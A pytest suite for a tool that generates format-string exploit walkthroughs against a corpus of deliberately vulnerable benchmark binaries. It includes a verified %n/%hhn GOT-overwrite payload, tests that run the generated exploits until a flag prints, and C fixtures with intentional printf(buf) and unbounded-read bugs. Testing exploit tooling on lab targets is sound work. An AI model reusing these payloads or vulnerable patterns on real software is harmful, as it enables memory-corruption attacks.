"""Tests for the format-string walkthrough family and its measurement layer.

The governing rule for this file: **rendering is not verification.**  Every
claim the family makes about targets 05 and 06 is checked by *running* the
generated script against the real binary, because the defects that matter in
this package have all been invisible to review.  The first wave shipped a false
claim about a leak's leading byte, a ``NameError`` at the reader's very first
command, a route made unreachable by a ``"FUNC"``-versus-``"STT_FUNC"`` filter,
and protections defaulting to "unprotected" when ``Binary._elf`` was absent.
Not one of those would have failed a test that only asked whether the script
parsed.

Two rules follow from that, and they are what make the assertions here
different in shape from a normal test:

* **Exit status is not a verdict.**  ``render.py``'s dispatch treats
  ``result is not False`` as success, so a step that returns ``None`` -- a step
  that does nothing at all -- passes an exit-status check.  Each step test
  therefore asserts a *step-specific observation* in the output.
* **"The output changed" is not a verdict either.**  Both targets echo the
  format string, so an exploit's output differs from a benign run whether or
  not the write landed.  ``b"flag" in out`` is likewise prohibited.  The
  criterion is a differential against a **same-shape control payload** -- ``%p``
  where the exploit uses ``%n``, or a deliberately corrupted canary -- which is
  the only comparison that isolates the primitive.

Covers `docs/plans/2026-09-24-walkthrough-family-fmtstr.md`.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest import mock

import pytest

from supwngo.exploit.walkthrough import fmtstr_probe
from supwngo.exploit.walkthrough.facts import (
    MeasuredOffset,
    ProtectionFacts,
    TargetFacts,
    collect_facts,
)
from supwngo.exploit.walkthrough.families import fmtstr
from supwngo.exploit.walkthrough.model import Confidence, Evidence
from supwngo.exploit.walkthrough.registry import generate_walkthrough, propose_routes
from supwngo.exploit.walkthrough.render import render_script

CORPUS = Path(__file__).resolve().parent.parent / "benchmark" / "corpus"

READ_TARGET = CORPUS / "05_fmtstr_arbread" / "fmtstr_arbread"
WRITE_TARGET = CORPUS / "06_fmtstr_arbwrite" / "fmtstr_arbwrite"

#: Every corpus target, as ``(directory, binary-name)``.
ALL_TARGETS = [
    ("01_shellcode_stack", "shellcode_stack"),
    ("02_ret2plt_system", "ret2plt_system"),
    ("03_pie_leak_ret2libc", "pie_leak_ret2libc"),
    ("04_canary_leak_bypass", "canary_leak_bypass"),
    ("05_fmtstr_arbread", "fmtstr_arbread"),
    ("06_fmtstr_arbwrite", "fmtstr_arbwrite"),
    ("07_ret2libc_leak", "ret2libc_leak"),
    ("08_ret2dlresolve", "ret2dlresolve"),
    ("09_srop", "srop"),
    ("10_int_overflow", "int_overflow"),
    ("11_heap_uaf_leak", "heap_uaf_leak"),
    ("12_heap_tcache_poison", "heap_tcache_poison"),
    ("13_off_by_one", "off_by_one"),
    ("14_negative_index", "negative_index"),
    ("15_win_function", "win_function"),
]

#: Targets with a real format-string bug. Everything else must abstain.
FMTSTR_TARGETS = {"fmtstr_arbread", "fmtstr_arbwrite"}


# ---------------------------------------------------------------------------
# fixtures and helpers
# ---------------------------------------------------------------------------


def _require(path: Path) -> str:
    if not path.exists():
        pytest.skip(f"{path.name} not built -- run benchmark/build_all.sh")
    return str(path)


@pytest.fixture(scope="module")
def read_facts():
    """Facts for target 05, probed for real. Cached: the probe runs the binary."""
    return collect_facts(_require(READ_TARGET), probe=True)


@pytest.fixture(scope="module")
def write_facts():
    """Facts for target 06, probed for real."""
    return collect_facts(_require(WRITE_TARGET), probe=True)


def _render_to(tmpdir: Path, facts) -> Path:
    """Render the walkthrough next to its binary, so relative paths resolve."""
    walkthrough = generate_walkthrough(facts)
    script = tmpdir / "wt.py"
    script.write_text(render_script(walkthrough))
    return script


def _run_step(script: Path, cwd: Path, index) -> tuple[str, int]:
    """Run one step (or the whole script when ``index`` is None)."""
    argv = [sys.executable, str(script)] + ([str(index)] if index else [])
    env = dict(os.environ, TERM="xterm", PWNLIB_NOTERM="1")
    done = subprocess.run(
        argv, cwd=str(cwd), capture_output=True, text=True, timeout=300, env=env
    )
    return done.stdout + done.stderr, done.returncode


@pytest.fixture(scope="module")
def read_script(read_facts, tmp_path_factory):
    directory = tmp_path_factory.mktemp("read")
    return _render_to(directory, read_facts), Path(read_facts.path).parent


@pytest.fixture(scope="module")
def write_script(write_facts, tmp_path_factory):
    directory = tmp_path_factory.mktemp("write")
    return _render_to(directory, write_facts), Path(write_facts.path).parent


# ---------------------------------------------------------------------------
# 1. route selection
# ---------------------------------------------------------------------------


def test_read_target_routes_to_fmtstr_arbitrary_read(read_facts):
    proposals = {family.NAME: route for family, route in propose_routes(read_facts)}
    assert "fmtstr" in proposals, "the family abstained on a target that has the bug"
    route = proposals["fmtstr"]
    assert route.name == fmtstr.ARBREAD
    assert route.applicable

    viable = [(n, r.score) for n, r in proposals.items() if r.applicable]
    winner = max(viable, key=lambda pair: pair[1])
    assert winner[0] == "fmtstr", f"another family outscored it: {viable}"


def test_write_target_routes_to_fmtstr_arbitrary_write(write_facts):
    proposals = {family.NAME: route for family, route in propose_routes(write_facts)}
    assert "fmtstr" in proposals
    route = proposals["fmtstr"]
    assert route.name == fmtstr.ARBWRITE
    assert route.applicable

    viable = [(n, r.score) for n, r in proposals.items() if r.applicable]
    assert max(viable, key=lambda pair: pair[1])[0] == "fmtstr"


def test_family_abstains_on_every_target_without_a_format_string_bug():
    """Abstention with *real* probing, not a stub.

    A stubbed probe would make this test unfalsifiable: the family abstains when
    ``facts.fmtstr`` is None, which is exactly what a stub would produce. The
    point is that the probe, run for real against a binary with no format-string
    bug, does not claim one -- which is how the false-positive on 01 and 03 was
    caught.
    """
    checked = 0
    for directory, binary in ALL_TARGETS:
        if binary in FMTSTR_TARGETS:
            continue
        path = CORPUS / directory / binary
        if not path.exists():
            continue
        facts = collect_facts(str(path), probe=True)
        route = fmtstr.propose(facts)
        assert route is None, (
            f"{binary} has no format-string bug but the family proposed "
            f"{route.name!r} at {route.score}: "
            f"{facts.fmtstr and facts.fmtstr.failure_reason}"
        )
        checked += 1
    if not checked:
        pytest.skip("corpus not built")


def _family_score_literals() -> dict[str, set[float]]:
    """Every ``score=<literal>`` a family module can emit, by module name.

    Read out of the source with ``ast`` rather than by calling ``propose``:
    calling it only reveals the scores the *current corpus* happens to reach,
    and the collision we are guarding against is with a route no corpus target
    triggers today.
    """
    import ast

    families_dir = (
        Path(fmtstr.__file__).resolve().parent
    )
    out: dict[str, set[float]] = {}
    for path in sorted(families_dir.glob("*.py")):
        if path.name in {"__init__.py", "common.py"}:
            continue
        scores: set[float] = set()
        for node in ast.walk(ast.parse(path.read_text())):
            if not isinstance(node, ast.keyword) or node.arg != "score":
                continue
            for leaf in ast.walk(node.value):
                if isinstance(leaf, ast.Constant) and isinstance(
                    leaf.value, (int, float)
                ):
                    scores.add(float(leaf.value))
                elif isinstance(leaf, ast.Name):
                    value = getattr(fmtstr, leaf.id, None)
                    if isinstance(value, (int, float)):
                        scores.add(float(value))
        out[path.stem] = scores
    return out


def test_no_fmtstr_score_ties_another_family_s_score():
    """A tie is decided by ``registry._families()`` order, which is not a score.

    ``generate_walkthrough`` picks with ``max()``, and ``max()`` keeps the first
    maximal element -- so two families that score identically are ranked by the
    position of their module in a list whose own docstring calls the order
    "presentation only". This family's read route used to sit at 0.90 (exactly
    ``stack_bof``'s ret2shellcode) and its GOT route at 0.80 (exactly
    ``syscall``'s ret2syscall). Neither collision was visible on targets 05/06,
    because on both of those the competing route is non-applicable -- it would
    have surfaced only on some later binary, or when a new family shifted the
    list.
    """
    by_module = _family_score_literals()
    assert "fmtstr" in by_module, "the AST scan found no fmtstr module"
    mine = {s for s in by_module.pop("fmtstr") if s > 0.0}
    assert mine, "the AST scan found no fmtstr scores -- it is not reading them"
    # Sanity: the scan must actually see other families' scores, or the
    # disjointness below is vacuously true.
    others = {s for scores in by_module.values() for s in scores if s > 0.0}
    assert len(others) >= 5, f"the scan is not reading other families: {by_module}"

    collisions = sorted(mine & others)
    assert not collisions, (
        f"fmtstr scores {collisions} tie another family, so selection there "
        f"depends on list order in registry._families(). Other families emit "
        f"{sorted(others)}."
    )


@pytest.mark.parametrize("target", ["read", "write"])
def test_winner_does_not_depend_on_family_list_order(target, read_facts, write_facts):
    """Reverse ``_families()`` and the winner must not move."""
    from supwngo.exploit.walkthrough import registry

    facts = read_facts if target == "read" else write_facts
    ordered = registry._families()
    winners = []
    for families in (ordered, list(reversed(ordered))):
        with mock.patch.object(registry, "_families", return_value=families):
            walkthrough = registry.generate_walkthrough(facts)
        winners.append(walkthrough.family)
    assert winners[0] == winners[1] == "fmtstr", (
        f"selection is order-dependent: {winners}"
    )


def test_offset_disagreement_is_named_rather_than_silently_overridden(read_facts):
    """The family drops OFFSET; the reader has to be told why.

    Target 05 is the case: the generic cyclic probe measures nothing because
    ``__stack_chk_fail`` aborts before ``ret``, while the canary-boundary sweep
    measures 72. Dropping the contradicted constant and saying nothing leaves a
    reader who re-runs the framework's own probe convinced the walkthrough was
    guessing.
    """
    assert read_facts.offset is None or read_facts.offset.value is None, (
        "the generic probe now succeeds on 05, so this test no longer describes "
        "a disagreement -- re-derive it rather than deleting it"
    )
    walkthrough = generate_walkthrough(read_facts, family="fmtstr")
    named = [
        v.describe()
        for v in walkthrough.protections
        if "two instruments disagree" in v.name
    ]
    assert len(named) == 1, [v.name for v in walkthrough.protections]
    text = named[0]
    assert "cyclic" in text, text
    assert str(read_facts.fmtstr.smash_offset) in text, text
    assert "SMASH_OFFSET" in text and "OFFSET means" in text, text

    # And the contradicted constant is genuinely gone from the emitted script,
    # so the note is not describing a discrepancy the script still contains.
    script = render_script(walkthrough)
    assert not re.search(r"^OFFSET\s*=", script, re.M), "OFFSET was emitted anyway"


# ---------------------------------------------------------------------------
# 2. every step runs AND observes something specific
# ---------------------------------------------------------------------------


READ_STEP_EXPECTATIONS = {
    1: [r"Binary matches"],
    2: [r"READ_DEMO_ADDR 0x[0-9a-f]+ holds", r"WIN_ADDR 0x[0-9a-f]+ is inside"],
    # The measured index must be PRINTED, not merely not-crashed.
    3: [r"FMT_INDEX = \d+", r"marker came back as 0x4141414141414141"],
    # A canary whose low byte is 00, observed three times.
    4: [r"canary=0x[0-9a-f]+00\b", r"Canary slot \d+ looks right"],
    5: [r"Boundary confirmed: \d+ clean, \d+ aborts"],
    6: [r"only with the correct canary", r"\breached\b"],
}

WRITE_STEP_EXPECTATIONS = {
    1: [r"Binary matches"],
    2: [r"WRITE_TARGET 0x[0-9a-f]+ .* is in writable section"],
    3: [r"FMT_INDEX = \d+", r"marker came back as 0x4141414141414141"],
    # The differential, by name: the control must be mentioned and beaten.
    4: [r"control \(\d+ bytes, same shape", r"only with the write",
        r"write landed"],
    5: [r"%hhn\s+writes 1 byte", r"count % 256 = 0x[0-9a-f]+"],
    6: [r"\breached\b"],
}


@pytest.mark.parametrize("index", sorted(READ_STEP_EXPECTATIONS))
def test_every_read_step_runs_and_reports_its_own_observation(read_script, index):
    script, cwd = read_script
    out, rc = _run_step(script, cwd, index)
    assert rc == 0, f"step {index} exited {rc}:\n{out}"
    # Exit status is necessary but NOT sufficient: dispatch treats a step that
    # returns None as success, so a step that does nothing passes rc == 0.
    for pattern in READ_STEP_EXPECTATIONS[index]:
        assert re.search(pattern, out), (
            f"step {index} exited 0 but never reported {pattern!r}:\n{out}"
        )
    assert "[-]" not in out, f"step {index} logged a failure:\n{out}"


@pytest.mark.parametrize("index", sorted(WRITE_STEP_EXPECTATIONS))
def test_every_write_step_runs_and_reports_its_own_observation(write_script, index):
    script, cwd = write_script
    out, rc = _run_step(script, cwd, index)
    assert rc == 0, f"step {index} exited {rc}:\n{out}"
    for pattern in WRITE_STEP_EXPECTATIONS[index]:
        assert re.search(pattern, out), (
            f"step {index} exited 0 but never reported {pattern!r}:\n{out}"
        )
    assert "[-]" not in out, f"step {index} logged a failure:\n{out}"


def test_measured_index_matches_the_facts_it_was_generated_from(
    read_script, read_facts
):
    """The index the reader measures must equal the index in the file.

    This is the assertion that catches an index that was right on the generating
    machine and is wrong on the reader's -- the exact failure mode the "never
    assumed" rule exists to prevent.
    """
    script, cwd = read_script
    out, _rc = _run_step(script, cwd, 3)
    printed = re.search(r"FMT_INDEX = (\d+)", out)
    assert printed, out
    assert int(printed.group(1)) == read_facts.fmtstr.arg_index


# ---------------------------------------------------------------------------
# 3. the assembled exploit wins against a same-shape control
# ---------------------------------------------------------------------------


def test_read_exploit_beats_a_corrupted_canary_control(read_script):
    """05's differential: identical overflow, deliberately wrong canary.

    Not a benign run. The program echoes the format string, so benign output
    differs from the exploit's no matter what -- including when the canary was
    restored wrongly and the process aborted.
    """
    script, cwd = read_script
    out, rc = _run_step(script, cwd, None)
    assert rc == 0, out
    assert "[-]" not in out, out
    # The script's own criterion, asserted rather than trusted.
    assert "canary = 0x" in out
    assert re.search(r"\[\+\].*FLAG\{", out), out


def test_write_exploit_beats_a_same_shape_percent_p_control(write_script):
    """06's differential: same payload, %n replaced by %p. Same echo, no write."""
    script, cwd = write_script
    out, rc = _run_step(script, cwd, None)
    assert rc == 0, out
    assert "[-]" not in out, out
    assert re.search(r"\[\+\].*FLAG\{", out), out


def test_control_payload_is_the_same_length_as_the_live_one():
    """The control has to be same-shape or the differential proves nothing.

    A shorter control echoes fewer bytes, which by itself changes the output --
    and then "the exploit's output differs" is measuring payload length, not the
    write. This is the property that makes the criterion honest, so it is
    asserted directly on the helper the generated script uses.
    """
    namespace: dict = {}
    # p64 is the only pwntools name the helper needs.
    namespace["p64"] = lambda value: int(value).to_bytes(8, "little")
    exec(fmtstr.FMT_HELPERS, namespace)

    payload = namespace["fmt_write_payload"](6, 0x40405C, 1, 1)
    assert payload is not None
    control = namespace["fmt_control_payload"](payload)
    assert len(control) == len(payload)
    assert b"$hhn" not in control and b"$lln" not in control
    assert b"$p" in control


def test_payload_builder_reproduces_the_verified_reference_payload():
    """The three-byte GOT write must come out byte-identical to the real one.

    ``%182c%11$lln%91c%12$hhn%47c%13$hhn`` plus three addresses is the payload
    that was verified by hand against target 06 before any of this was written.
    Pinning it means a refactor of the mod-256 arithmetic cannot quietly produce
    something that merely looks plausible.
    """
    namespace: dict = {"p64": lambda v: int(v).to_bytes(8, "little")}
    exec(fmtstr.FMT_HELPERS, namespace)

    payload = namespace["fmt_write_payload"](6, 0x404030, 0x4011B6, 3, zero_fill=True)
    assert payload is not None
    assert payload.startswith(b"%182c%11$lln%91c%12$hhn%47c%13$hhn")
    assert payload.endswith(
        (0x404030).to_bytes(8, "little")
        + (0x404031).to_bytes(8, "little")
        + (0x404032).to_bytes(8, "little")
    )
    assert len(payload) == 64


# ---------------------------------------------------------------------------
# 4. provenance: MEASURED with its command, or UNKNOWN
# ---------------------------------------------------------------------------


def test_index_is_measured_and_carries_the_command_that_measured_it(read_facts):
    fs = read_facts.fmtstr
    assert fs.arg_index is not None
    assert fs.arg_index_confidence is Confidence.MEASURED
    assert fs.arg_index_evidence is not None
    assert fs.arg_index_evidence.command, "a MEASURED index with no command"
    assert "$p" in fs.arg_index_evidence.command

    walkthrough = generate_walkthrough(read_facts)
    index_fact = walkthrough.fact("FMT_INDEX")
    assert index_fact.confidence is Confidence.MEASURED
    assert index_fact.evidence and index_fact.evidence.command


def _synthetic_facts(*, arg_index, aligned=True, canary=True, targets=()):
    """A minimal TargetFacts carrying a hand-built FormatStringFacts."""
    path = shutil.which("true") or "/bin/true"
    facts = TargetFacts(
        path=path,
        bits=64,
        protections=ProtectionFacts(
            nx=True, pie=False, canary=canary, relro="Partial RELRO"
        ),
        vuln_function="vuln",
        win_functions=[("win", 0x401196)],
    )
    facts.fmtstr = fmtstr_probe.FormatStringFacts(
        reachable=True,
        arg_index=arg_index,
        arg_index_evidence=(
            Evidence(method="marker probe", command="printf '%6$p' | ./vuln")
            if arg_index is not None
            else None
        ),
        buffer_aligned=aligned,
        echo_capacity=127,
        write_targets=tuple(targets),
        failure_reason=None if arg_index is not None else "the marker never returned",
    )
    return facts


def test_unmeasured_index_withholds_the_write_route_entirely():
    """No index means no %n route. Not a low-scoring one -- none at all."""
    gate = fmtstr_probe.WriteTarget(
        name="unlocked",
        address=0x40405C,
        kind="gate",
        evidence=Evidence(method="rip-relative reference in vuln()"),
    )
    with_index = _synthetic_facts(arg_index=6, targets=(gate,))
    without = _synthetic_facts(arg_index=None, targets=(gate,))

    assert fmtstr.propose(with_index).name == fmtstr.ARBWRITE
    route = fmtstr.propose(without)
    assert route is not None
    assert route.name == fmtstr.ARBREAD, (
        "with the index unknown the family must fall back to the read route, "
        "never offer %n"
    )


def test_unmeasured_index_renders_as_unknown_naming_its_resolving_step():
    facts = _synthetic_facts(arg_index=None, canary=False)
    # Forced, because the point is what THIS family authors -- on a stub binary
    # another family may legitimately outscore it and then the assertions below
    # would be testing the wrong builder.
    walkthrough = generate_walkthrough(facts, family="fmtstr")
    index_fact = walkthrough.fact("FMT_INDEX")
    assert index_fact.confidence is Confidence.UNKNOWN
    assert index_fact.resolved_by == "argindex"
    assert index_fact.unknown_reason
    # And the step it names must exist and must not be the step that consumes it.
    assert any(step.id == "argindex" for step in walkthrough.steps)
    # The rendered script must refuse rather than use a placeholder number.
    source = render_script(walkthrough)
    assert "NotImplementedError" in source


def test_misaligned_buffer_withholds_the_write_route():
    gate = fmtstr_probe.WriteTarget(
        name="unlocked",
        address=0x40405C,
        kind="gate",
        evidence=Evidence(method="rip-relative reference in vuln()"),
    )
    facts = _synthetic_facts(arg_index=6, aligned=False, targets=(gate,))
    route = fmtstr.propose(facts)
    assert route.name == fmtstr.ARBREAD, (
        "a buffer that is not slot-aligned needs pad arithmetic this family has "
        "not measured; it must not ship a %n payload anyway"
    )


def test_leak_with_no_consumer_is_non_applicable_not_merely_low_scoring():
    """A disclosure that unlocks nothing must not be able to win a binary.

    Scoring it at 0.62 would let it outrank, for instance, a ret2libc route at
    0.60 on a binary where the leak accomplishes nothing -- stealing the
    walkthrough from a family that can actually take control.
    """
    facts = _synthetic_facts(arg_index=6, canary=False, targets=())
    route = fmtstr.propose(facts)
    assert route is not None
    assert route.name == fmtstr.ARBREAD
    assert not route.applicable
    assert route.rejection is not None
    assert route.becomes_viable_if


# ---------------------------------------------------------------------------
# 5. no canary value is ever a constant
# ---------------------------------------------------------------------------


def test_canary_value_is_never_emitted_as_a_constant(read_facts):
    """The SLOT is a constant; the VALUE must not be.

    A canary is re-rolled per process, so a hardcoded value works exactly once
    on exactly one machine. This asserts on the *facts* rather than by grepping
    the rendered text, because a grep for a hex literal would pass for reasons
    that have nothing to do with the property being tested.
    """
    walkthrough = generate_walkthrough(read_facts)
    canary_value = read_facts.fmtstr.slots.get(read_facts.fmtstr.canary_slot, ())

    for fact in walkthrough.constants:
        assert fact.runtime is False, (
            f"{fact.name} is a runtime value but was emitted as a constant"
        )
        if isinstance(fact.value, int):
            for observed in canary_value:
                number = int(observed, 16) if observed.startswith("0x") else None
                assert fact.value != number, (
                    f"{fact.name} is a leaked canary value baked in as a constant"
                )

    # The slot, by contrast, must be there -- it is a real, stable fact.
    assert walkthrough.fact("CANARY_SLOT").confidence is Confidence.MEASURED


# ---------------------------------------------------------------------------
# 6. verification refuses rather than warns
# ---------------------------------------------------------------------------


def test_verify_targets_returns_false_on_a_bogus_address(write_script):
    """Patch the write target to a read-only address; the step must REFUSE.

    Deliberately not aimed at ``common.preflight_step``: that step verifies only
    the declared ``G_*`` gadget constants, so patching a non-gadget constant
    there would change nothing and the test could not fail.
    """
    script, cwd = write_script
    source = script.read_text()
    patched = re.sub(
        r"^WRITE_TARGET = 0x[0-9a-fA-F]+",
        "WRITE_TARGET = 0x400318",  # .interp: mapped, but read-only
        source,
        count=1,
        flags=re.M,
    )
    assert patched != source, "WRITE_TARGET constant not found to patch"

    with tempfile.TemporaryDirectory() as directory:
        bad = Path(directory) / "wt.py"
        bad.write_text(patched)
        out, rc = _run_step(bad, cwd, 2)

    assert rc != 0, f"a read-only write target was accepted:\n{out}"
    assert "REFUSING" in out, out


def test_digest_mismatch_warns_but_does_not_refuse(write_script):
    """The other half of the same policy: a rebuild is a warning, not a stop."""
    script, cwd = write_script
    source = script.read_text()
    patched = re.sub(
        r"^BINARY_SHA256 = ['\"][0-9a-f]{64}['\"]",
        "BINARY_SHA256 = '%s'" % ("0" * 64),
        source,
        count=1,
        flags=re.M,
    )
    assert patched != source

    with tempfile.TemporaryDirectory() as directory:
        bad = Path(directory) / "wt.py"
        bad.write_text(patched)
        out, rc = _run_step(bad, cwd, 1)

    assert "[!]" in out or "warn" in out.lower(), out


# ---------------------------------------------------------------------------
# 7. the OFFSET trap
# ---------------------------------------------------------------------------


def test_builds_when_the_cyclic_offset_probe_failed():
    """``base_constants`` emits an UNKNOWN ``OFFSET`` resolved by a step we lack.

    Left in place, ``Walkthrough.validate()`` rejects the walkthrough at
    construction. This is target 05's real situation -- ``__stack_chk_fail``
    aborts before ``ret``, so the cyclic probe never sees a SIGSEGV -- so the
    failure would have been total rather than cosmetic.
    """
    facts = _synthetic_facts(arg_index=6, canary=False)
    facts.offset = MeasuredOffset(
        value=None,
        confidence=Confidence.UNKNOWN,
        evidence=Evidence(method="not measured"),
        plausible="72 or 88",
        failure_reason="no SIGSEGV: __stack_chk_fail aborted first",
        probe_failed=True,
    )
    walkthrough = generate_walkthrough(facts, family="fmtstr")  # must not raise
    names = {fact.name for fact in walkthrough.constants}
    assert "OFFSET" not in names, (
        "OFFSET survived into a walkthrough with no step that resolves it"
    )


# ---------------------------------------------------------------------------
# 8. probe unit tests over purpose-compiled fixtures
# ---------------------------------------------------------------------------

GCC = shutil.which("gcc")

FIXTURES = {
    # Echoes safely with puts AND formats unsafely afterwards. The probe must
    # NOT be talked out of the real bug by the safe echo.
    "safe_echo_then_vuln": r"""
        #include <stdio.h>
        int main(void) {
            char buf[128];
            if (!fgets(buf, sizeof buf, stdin)) return 0;
            fputs(buf, stdout);            /* safe: input as DATA */
            printf(buf);                   /* the bug */
            putchar('\n');
            return 0;
        }
    """,
    # Prints pointer-shaped tokens but never interprets a format string. The
    # escaped %%N$p control must look identical and the probe must abstain.
    "hex_dumper": r"""
        #include <stdio.h>
        int main(void) {
            char buf[128];
            if (!fgets(buf, sizeof buf, stdin)) return 0;
            printf("in  @ %p\n", (void *)buf);
            for (int i = 0; buf[i] && i < 16; i++) printf("0x%02x ", buf[i]);
            printf("\n%s", buf);           /* safe: %s, not the format */
            return 0;
        }
    """,
    # Aborts for a reason that has nothing to do with a canary. A bare
    # `rc == -6` verdict would call this a stack smash.
    "unrelated_abort": r"""
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        int main(void) {
            char buf[64];
            ssize_t n = read(0, buf, 4096);   /* deliberately unbounded */
            if (n > 32) { fprintf(stderr, "policy violation\n"); abort(); }
            printf("%s", buf);
            return 0;
        }
    """,
}


def _compile(name: str, source: str, directory: Path) -> Path | None:
    if not GCC:
        return None
    src = directory / f"{name}.c"
    src.write_text(source)
    out = directory / name
    done = subprocess.run(
        [
            GCC, "-O0", "-g", "-no-pie", "-fno-stack-protector",
            "-D_FORTIFY_SOURCE=0", "-Wno-format-security", "-Wno-format",
            "-Wno-implicit-function-declaration",
            str(src), "-o", str(out),
        ],
        capture_output=True,
        text=True,
    )
    if done.returncode != 0:
        return None
    return out


@pytest.fixture(scope="module")
def fixture_binaries(tmp_path_factory):
    if not GCC:
        pytest.skip("gcc not available")
    directory = tmp_path_factory.mktemp("fmtfixtures")
    built = {}
    for name, source in FIXTURES.items():
        path = _compile(name, source, directory)
        if path is not None:
            built[name] = path
    if not built:
        pytest.skip("none of the probe fixtures compiled")
    return built


def test_safe_echo_does_not_hide_a_real_format_string_bug(fixture_binaries):
    """Literal echo must never be grounds for abstention.

    The first draft rejected on the first window whose specifiers came back
    verbatim. This binary echoes AND formats, so that draft would have declared
    it clean.
    """
    path = fixture_binaries.get("safe_echo_then_vuln")
    if path is None:
        pytest.skip("fixture did not compile")
    benign, _rc = fmtstr_probe._deliver(str(path), [b"benign\n"])
    reachable, literal_echo, index, evidence, reason, aligned, _note = (
        fmtstr_probe.probe_arg_index(str(path), benign)
    )
    assert reachable, f"missed a real bug behind a safe echo: {reason}"
    assert literal_echo, "the echo really is there and should be recorded"
    assert index is not None and evidence is not None
    assert aligned


def test_hex_dumper_is_not_mistaken_for_a_format_string_bug(fixture_binaries):
    path = fixture_binaries.get("hex_dumper")
    if path is None:
        pytest.skip("fixture did not compile")
    benign, _rc = fmtstr_probe._deliver(str(path), [b"benign\n"])
    reachable, _echo, index, _ev, reason, _aligned, _note = (
        fmtstr_probe.probe_arg_index(str(path), benign)
    )
    assert not reachable, (
        f"claimed a format-string bug in a program that only prints its own "
        f"addresses (index={index})"
    )
    assert reason


def test_unrelated_sigabrt_is_not_reported_as_a_stack_smash(fixture_binaries):
    """`rc == -6` is not evidence; the glibc message is."""
    path = fixture_binaries.get("unrelated_abort")
    if path is None:
        pytest.skip("fixture did not compile")
    # It really does abort, so the test can fail for the right reason.
    _out, rc = fmtstr_probe._deliver(str(path), [b"A" * 64])
    assert rc == -6, f"fixture did not SIGABRT (rc={rc}); the test is vacuous"

    assert not fmtstr_probe._smashes(str(path), 1, 64), (
        "an abort with no '*** stack smashing detected ***' was counted as one"
    )
    offset, stage, _evidence = fmtstr_probe.probe_smash_offset(str(path))
    assert offset is None and stage is None


def test_pointer_token_count_is_a_count_and_not_a_value_set():
    """A count, not a value set. This is the fix for the 01/03 false positive.

    Two properties, and the first is the one that makes this falsifiable: a
    *count* of two identical tokens is 2, where a set-based implementation says
    1. The original defect was exactly a set: the reachability differential
    subtracted the benign run's token *values*, and because 01 and 03 print their
    own ASLR'd pointer, that difference was never empty and every run reported a
    format-string bug that did not exist.
    """
    repeated = b"a @ 0x41414141\nb @ 0x41414141\n"
    assert fmtstr_probe._pointer_token_count(repeated) == 2, (
        "this is counting distinct values, not occurrences -- the set-based "
        "implementation that produced the 01/03 false positive"
    )

    # And the property the differential relies on: invariant across runs.
    first = b"buf @ 0x7ffd1c2908e0\nLeak: 0x584d00001000\n"
    second = b"buf @ 0x7ffea0b13420\nLeak: 0x5f2100001000\n"
    assert fmtstr_probe._pointer_token_count(first) == 2
    assert fmtstr_probe._pointer_token_count(
        first
    ) == fmtstr_probe._pointer_token_count(second)
    # A value-level comparison, by contrast, always reports something new --
    # which is why it cannot be the verdict.
    import re as _re

    assert set(_re.findall(rb"0x[0-9a-f]+", second)) - set(
        _re.findall(rb"0x[0-9a-f]+", first)
    ), "the fixture must actually exhibit the ASLR drift this guards against"


def test_decoy_canary_shaped_slot_is_rejected_when_it_shares_a_mapping():
    """Shape alone is not enough, and the pointer band must not assume 48 bits.

    The decoy here is volatile, has a zero low byte, and is far larger than a
    small integer -- every predicate a shape search would use. What gives it away
    is that it shares its high bytes with another slot on the same run, which is
    what a pointer into a mapping does and what eight random bytes do not. The
    values are above 2^48 on purpose: a hardcoded `< 2^48` band would pass them
    through, which is precisely what breaks under 5-level paging.
    """
    table = {
        10: ("0x1fffaabbcc1100", "0x1fffddeeff2200", "0x1fff112233440 0".replace(" ", "")),
        11: ("0x1fffaabbcc2200", "0x1fffddeeff3300", "0x1fff1122334500"),
        12: ("0x9f3c72a1bd4e00", "0x4a81e50c39f700", "0xd27b44916ca800"),
    }
    assert not fmtstr_probe._looks_like_canary(table[10], table=table), (
        "a slot sharing a mapping prefix with its neighbour was accepted"
    )
    assert fmtstr_probe._looks_like_canary(table[12], table=table), (
        "a genuinely unshared, volatile, low-byte-zero slot was rejected"
    )


def test_stage_one_result_is_rejected_when_it_is_really_spillover(read_facts):
    """Target 05's defect, pinned.

    Sent as one blob, padding spills from ``read(name, 63)`` into
    ``read(buf, 200)`` and the boundary appears at 63 + 72 = 135 as "input #1".
    That is a true fact about a framing the exploit cannot use, because the
    exploit must spend input #1 on the format string. The measurement must be
    stage 2 at 72.
    """
    fs = read_facts.fmtstr
    assert fs.smash_offset == 72
    assert fs.smash_stage == 2
    assert fs.echo_capacity == 63
    # The measured stage-2 offset must be BELOW the echo budget of the earlier
    # read plus itself -- i.e. it is not the spillover number. 63 + 72 = 135 is
    # what the unguarded sweep reported as "input #1", and the guard that rejects
    # it is `offset >= echo_capacity` for stage 1.
    assert fs.smash_offset != 135
    assert fs.smash_offset < fs.echo_capacity + fs.smash_offset


def test_spillover_predicate_rejects_only_the_mis_attributable_case():
    """The guard itself, as a unit.

    Mutation testing found this guard unfalsifiable end to end: the stage-2
    sweep succeeds first on every corpus target, so deleting the inline check
    left the whole suite green. It is a named predicate for that reason, and
    these are the four cases that define it.
    """
    # Stage 1 at or past the first read's capacity: spillover, reject.
    assert fmtstr_probe._is_spillover(1, 135, 63) is True
    assert fmtstr_probe._is_spillover(1, 63, 63) is True
    # Stage 1 within capacity: a real measurement of write #1.
    assert fmtstr_probe._is_spillover(1, 40, 63) is False
    # Stage 2 is measured with write #1 already spent, so capacity says nothing.
    assert fmtstr_probe._is_spillover(2, 135, 63) is False
    # Capacity unmeasured: no grounds to reject, and guessing is not allowed.
    assert fmtstr_probe._is_spillover(1, 135, None) is False


def test_spillover_predicate_is_actually_wired_into_the_sweep(read_facts):
    """Pin the call site, not just the predicate.

    A correct predicate nobody calls is the same defect in a different place.
    Forcing it to reject everything must make the sweep report no offset at
    all -- if the sweep still returns 72, the guard is not on the path.
    """
    fs = read_facts.fmtstr
    with mock.patch.object(fmtstr_probe, "_is_spillover", return_value=True):
        offset, stage, evidence = fmtstr_probe.probe_smash_offset(
            read_facts.path,
            echo_capacity=fs.echo_capacity,
            vuln_function=read_facts.vuln_function,
        )
    assert (offset, stage, evidence) == (None, None, None)


def test_budget_stops_the_probe_rather_than_letting_it_run_away():
    budget = fmtstr_probe._Budget(max_runs=2, max_seconds=60)
    path = shutil.which("true") or "/bin/true"
    for _ in range(2):
        fmtstr_probe._deliver(path, [b"x\n"], budget=budget)
    assert budget.exhausted
